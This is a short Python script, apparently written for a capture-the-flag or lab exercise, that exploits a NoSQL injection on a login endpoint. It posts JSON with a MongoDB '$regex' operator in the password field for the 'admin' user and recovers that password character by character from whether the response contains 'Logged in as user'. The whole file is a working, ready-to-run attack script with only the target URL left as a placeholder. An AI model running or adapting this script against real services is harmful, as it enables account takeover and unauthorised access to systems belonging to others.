#!/usr/bin/python3

from pwn import *
import requests
import time
import sys
import signal
import string

def def_handler(sig, frame):
    print("\n\n[X] Exiting...\n") 
    sys.exit(1)
    

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
url_target = "$URL"
characters = string.ascii_lowercase + string.ascii_uppercase +  string.digits

def makeNOSQLI():

    password = ''

    p1 = log.progress("Brute Force")
    p1.status("Initiating brute force process")
    
    time.sleep(1)

    p2 = log.progress('Password')

    for position in range(1, 100):
        for character in characters:
            
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)

            p1.status(post_data)
            
            headers = {'Content-Type': 'application/json'}

            r = requests.post(url_target, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":
    
    makeNOSQLI()
